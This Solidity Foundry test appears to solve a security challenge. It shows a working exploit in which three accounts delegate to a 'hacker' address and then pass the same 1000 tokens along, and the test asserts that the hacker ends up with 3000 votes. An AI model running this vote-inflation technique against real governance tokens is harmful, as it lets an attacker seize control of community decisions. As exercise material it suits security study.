// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test , console} from "forge-std/Test.sol";
import "../src/VotingMachine.sol";

contract exploitTest is Test {
    VoteToken vToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carl = address(3);

    function setUp() public {
        vm.startPrank(owner);
        address vtoken = deployCode("src/VotingMachine.sol:VoteToken");
        vToken = VoteToken(vtoken);

        vToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploit_ex() public {
        
        vm.startPrank(alice);
        vToken.delegate(hacker);
        vToken.transfer(carl, vToken.balanceOf(alice));
        vm.stopPrank();

        vm.startPrank(carl);
        vToken.delegate(hacker);
        vToken.transfer(bob, vToken.balanceOf(carl));
        vm.stopPrank();

        vm.startPrank(bob);
        vToken.delegate(hacker);
        vToken.transfer(hacker, vToken.balanceOf(bob));
        vm.stopPrank();
    
        (, uint256 votes0) =  vToken.checkpoints(hacker , 0);
        console.log("checkPoint 0 : ", votes0);

        (, uint256 votes) =  vToken.checkpoints(alice , 0);
        console.log("checkPoint : ", votes);
        console.log("");
        (, uint256 votes1) =  vToken.checkpoints(bob , 0);
        (, uint256 votes2) = vToken.checkpoints(carl , 0);

        console.log("checkPoint 1: ", votes1);
        console.log("checkPoint 2 : ", votes2);
        vm.stopPrank();
        uint hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        uint hacker_balance= vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote , 3000);
        assertEq(hacker_balance, 1000);
    }
}
